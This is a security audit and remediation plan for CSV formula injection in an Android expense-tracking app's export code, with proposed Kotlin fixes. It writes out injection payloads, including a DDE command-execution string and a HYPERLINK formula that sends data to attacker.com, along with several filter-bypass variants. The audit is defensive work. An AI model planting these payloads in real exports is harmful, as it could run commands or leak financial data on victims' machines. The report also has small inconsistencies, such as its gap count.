# CSV Export Formula Injection Security Analysis & Test Suite (T14)

**Document ID:** SEC-REP-T14-2026-11-04  
**Date:** 2026-11-04  
**Target:** `com.vaibhav.kharchapaani.domain.CsvExport`  
**Classification:** CWE-1236 (Improper Neutralization of Formula Elements in a CSV File), OWASP CSV Injection  
**Audience:** Claude, Codex, Maintainers  
**Status:** Audit & Test Suite Complete; Ready for Implementation  

---

## 1. Executive Summary

Kharcha Paani allows users to export their financial ledger to CSV (`CsvExport.kt`). Because the ledger contains untrusted and external user input (merchant names, notes, custom categories, payment methods, friend/guest names, group titles), exporting these records into spreadsheet software (Microsoft Excel, LibreOffice Calc, Google Sheets) poses a potential **Formula Injection (CSV Injection / CWE-1236)** risk.

In a formula injection attack, an attacker crafts an input (e.g. as a split member's name, a transaction note, or a merchant description) beginning with formula triggers such as `=`, `+`, `-`, `@`. When an unsuspecting user exports the ledger and opens the CSV in Excel or LibreOffice, the spreadsheet software treats the text as an executable formula. This can result in:
1. **Dynamic Data Exchange (DDE) Remote Code Execution:** e.g., `=cmd|' /C calc'!A0` executing commands on the user's desktop.
2. **Data Exfiltration / Phishing:** e.g., `=HYPERLINK("https://attacker.com/leak?q=" & A1, "Error - Click to Re-authenticate")`.
3. **Ledger Subversion:** e.g., formulas that silently recalculate or zero out balances in accounting spreadsheets.

The current implementation in `CsvExport.kt` implements RFC 4180 double-quoting and neutralizes leading triggers by prefixing with a single apostrophe (`'`). However, our audit revealed **5 significant security gaps and functional edge cases** that leave the application partially vulnerable or degrade spreadsheet usability.

---

## 2. Audit of Current Implementation

### Current Logic in `CsvExport.kt`

The relevant quoting code in `CsvExport.kt` (lines 148–161) is:

```kotlin
private fun line(fields: List<String>) = fields.joinToString(",", postfix = "\r\n") { quote(it) }

// RFC 4180 quoting. A cell starting with = + - @ runs as a formula in a spreadsheet, so a merchant
// or note like "=HYPERLINK(...)" gets a leading apostrophe; amounts are written unsigned.
private fun quote(field: String): String {
    val safe = if (field.isNotEmpty() && field[0] in FORMULA_STARTS) "'$field" else field
    return "\"" + safe.replace("\"", "\"\"") + "\""
}

private val FORMULA_STARTS = setOf('=', '+', '-', '@', '\t', '\r')
```

### Export Column Structure (13 Columns)

| Index | Column Name | Source in Expense Rows | Source in Settlement Rows | User Controlled? |
|---|---|---|---|---|
| 0 | `Date` | `at.format(DATE)` | `at.format(DATE)` | No |
| 1 | `Time` | `at.format(TIME)` | `at.format(TIME)` | No |
| 2 | `Type` | `"Income"` / `"Expense"` | `"IOU"` / `"Settlement"` | No |
| 3 | `Amount (INR)` | `money(tx.amount)` | `money(settlement.amount)` | Numeric |
| 4 | `Your share (INR)` | `money(...)` | `money(settlement.amount)` | Numeric |
| 5 | `Category` | `tx.category` | `""` | **Yes** |
| 6 | `Merchant / payee` | `tx.merchant` | `"$from paid $to"` / `"$from lent $to"` | **Yes** (Direct & Composite) |
| 7 | `Payment method` | `tx.paymentMethod` | `""` | **Yes** |
| 8 | `Group` | `groupNames[tx.groupId]` | `groupNames[settlement.groupId]` | **Yes** |
| 9 | `Split` | `"Split (...)"` / `"Personal"` | `""` | Low (Prefix constant) |
| 10 | `Paid by` | `nameOf(split.paidByPersonId)` | `from` | **Yes** |
| 11 | `Shares` | `shares.joinToString("; ") { "${nameOf(it.personId)}: ${money(it.shareAmount)}" }` | `""` | **Yes** (Composite) |
| 12 | `Note` | `tx.note` | `settlement.note` | **Yes** |

---

## 3. Vulnerability Findings & Edge Case Analysis

### Gap 1: Leading Whitespace Bypass (`"   =..."` and `"   @SUM(A1)"`)
* **Vulnerability:** `quote()` checks only `field[0] in FORMULA_STARTS`. If a payload has leading spaces (e.g. `"   =1+1"` or `"   @SUM(A1)"`), `field[0]` is ASCII `0x20` (`' '`), which is not in `FORMULA_STARTS`.
* **Impact:** 
  - In **LibreOffice Calc**, the default text import dialog contains a "Trim spaces" option. When selected, Calc trims the leading spaces upon loading and immediately executes `=1+1`.
  - In automated Excel data ingestion pipelines (VBA `.Trim()`, PowerQuery, Python pandas with space stripping), leading whitespace is stripped before formulas are evaluated.
* **Status:** **VULNERABLE** to bypass.

### Gap 2: Unix Line Feed (`\n` / 0x0A) Missing from `FORMULA_STARTS`
* **Vulnerability:** `FORMULA_STARTS` includes `\r` (CR) and `\t` (Tab), but **omits `\n` (LF)**.
* **Mechanism:** On Android and Unix systems, multi-line strings or input fields frequently start with `\n` without `\r`. If an attacker supplies `"\n=cmd|' /C calc'!A0"`, `field[0]` is `'\n'`.
* **Impact:** `quote()` does not escape the field with `'`. The exported CSV cell is `"\"\n=cmd...\""`. When opened in Excel, spreadsheet parsers that strip leading control characters or treat LF as line separators will parse `=cmd` as an active formula.
* **Status:** **VULNERABLE** to bypass.

### Gap 3: Negative Numbers Quoted as Text (`"-50.00"` -> `"'-50.00'"`)
* **Finding:** If an amount is negative (e.g., `-50.00`), `money()` produces `"-50.00"`.
* **Behavior:** Because `'-'` is in `FORMULA_STARTS`, `quote("-50.00")` turns it into `"'-50.00'"`.
* **Impact:** 
  - In Excel and LibreOffice Calc, the leading single quote explicitly casts the cell to a **Text Literal** (`@` format).
  - The cell **cannot be summed** using `=SUM()` and arithmetic operations fail.
  - A strictly numeric negative string (matching `^-\d+(\.\d+)?$`) is mathematical data, **not** an executable formula.
  - While line 151 notes `"amounts are written unsigned"`, the code neither enforces `abs()` nor prevents negative `Double` amounts from being quoted as text.
* **Status:** **FUNCTIONAL DEFECT / DEGRADED UX**.

### Gap 4: Subfields & Composite Fields in "Shares"
* **Finding:** In Column 11 ("Shares"), entries are generated via:
  ```kotlin
  ft.shares.joinToString("; ") { "${nameOf(it.personId)}: ${money(it.shareAmount)}" }
  ```
* **Asymmetry:**
  - If **Person 1** is `=cmd`: The composite string starts with `"=cmd: 100.00; Bob: 200.00"`. `field[0]` is `'='`, so `quote()` prepends `'`.
  - If **Person 2** is `=cmd`: The composite string is `"Alice: 100.00; =cmd: 200.00"`. `field[0]` is `'A'`. `quote()` does **not** escape it!
* **Second-Order Risk:** When users or accounting staff import CSVs and perform standard "Text to Columns" (splitting by `;`), the second column begins with `=cmd: 200.00`, executing formula injection upon cell generation.
* **Status:** **PARTIALLY VULNERABLE** (Second-order injection).

### Gap 5: Settlement Payee Composite Injection (`"$from paid $to"`)
* **Finding:** Column 6 ("Merchant / payee") for settlements renders:
  ```kotlin
  if (settlement.isIou) "$from lent $to" else "$from paid $to"
  ```
* **Asymmetry:**
  - If `$from` is `"=cmd"`: Composite string is `"=cmd paid You"`. `field[0]` is `'='`, escaped by `quote()`.
  - If `$to` is `"=cmd"` (e.g. "You paid =cmd"): Composite string starts with `'Y'`. `field[0]` is NOT in `FORMULA_STARTS`.
  - If `$from` has leading space `" =cmd"`: Composite string starts with `' '`. Neither `$from` nor the whole cell is escaped.
* **Status:** **PARTIALLY VULNERABLE**.

### Gap 6: Missing Full-Width Unicode Formula Starters & Pipe (`|`)
* **Finding:** East Asian versions of Microsoft Excel (Japanese, Chinese, Korean) automatically normalize full-width Unicode characters:
  - `＝` (`\uFF1D`) $\rightarrow$ `=`
  - `＋` (`\uFF0B`) $\rightarrow$ `+`
  - `－` (`\uFF0D`) $\rightarrow$ `-`
  - `＠` (`\uFF20`) $\rightarrow$ `@`
* **Status:** Bypasses ASCII-only blocklists in localized spreadsheet environments.

---

## 4. Vulnerability & Defense Matrix

| Field | Injection Payload Example | Current Output | Safe? | Remediation Required |
|---|---|---|---|---|
| `tx.merchant` | `=HYPERLINK("http://evil.com")` | `"'=HYPERLINK(...) "` | ✅ Yes | Keep single quote prefix |
| `tx.merchant` | `   =1+1` (leading spaces) | `"   =1+1"` | ❌ No | Check `trimStart()[0]` before escaping |
| `tx.merchant` | `\n=cmd\|' /C calc'!A0` | `"\n=cmd..."` | ❌ No | Add `\n` to `FORMULA_STARTS` |
| `tx.category` | `+12345` | `"'+12345'"` | ✅ Yes | Single quote prepended |
| `tx.amount` | `-50.00` (negative amount) | `"'-50.00'"` | ⚠️ Degraded | If numeric (`toDoubleOrNull() != null`), do not prepend `'` |
| Settlement `to` | `You paid =cmd` | `"You paid =cmd"` | ⚠️ Risk | Sanitize sub-names or sanitize before composite join |
| Shares (2nd person)| `Alice: 10; =cmd: 20` | `"Alice: 10; =cmd: 20"`| ⚠️ Risk | Sanitize individual person names before joining |
| `tx.note` | `＝SUM(A1)` (Full-width) | `"＝SUM(A1)"` | ❌ No | Include full-width Unicode formula starters |

---

## 5. Concrete Recommendations for Claude & Codex

To fix all vulnerabilities cleanly without breaking existing tests or performance, update `CsvExport.kt`:

### Recommended Code Implementation

```kotlin
// In CsvExport.kt:

private val FORMULA_STARTS = setOf(
    '=', '+', '-', '@', '\t', '\r', '\n', '|',
    '\uFF1D', // Full-width =
    '\uFF0B', // Full-width +
    '\uFF0D', // Full-width -
    '\uFF20', // Full-width @
)

private fun quote(field: String): String {
    // 1. If it's a valid number (e.g. negative amount "-50.00"), keep it numeric for Excel/Calc.
    val isNumeric = field.toDoubleOrNull() != null
    
    // 2. Trim leading whitespace/control characters to detect hidden formula triggers.
    val trimmed = field.trimStart(' ', '\t', '\r', '\n')
    
    val needsPrefix = !isNumeric && trimmed.isNotEmpty() && trimmed[0] in FORMULA_STARTS
    val safe = if (needsPrefix) "'$field" else field
    return "\"" + safe.replace("\"", "\"\"") + "\""
}
```

### Sanitizing Composite Subfields
For person names inside composite strings (`Shares` and `Settlement` payee), sanitize person names when formatting:
```kotlin
fun sanitizeName(name: String): String {
    val trimmed = name.trimStart(' ', '\t', '\r', '\n')
    return if (trimmed.isNotEmpty() && trimmed[0] in FORMULA_STARTS) "'$name" else name
}
```

---

## 6. Verification and "Check on the Phone"

1. **Unit Tests:** Execute `CsvFormulaInjectionTest` and `CsvExportTest`:
   `./gradlew :app:testDebugUnitTest --tests "com.vaibhav.kharchapaani.domain.*"`
2. **Device Verification:**
   - On the phone, create an expense with merchant `=HYPERLINK("https://google.com","Google")` and note `   @SUM(1,2)`.
   - Export CSV via Account Sheet $\rightarrow$ Export CSV.
   - Send the CSV to a PC via email or Google Drive.
   - Open the exported CSV in **Microsoft Excel** and **LibreOffice Calc**:
     - Verify no formula executes and no DDE / security prompt appears.
     - Verify cells display the text cleanly.
     - Verify negative numbers (if any) are formatted as numbers and can be summed with `=SUM(...)`.
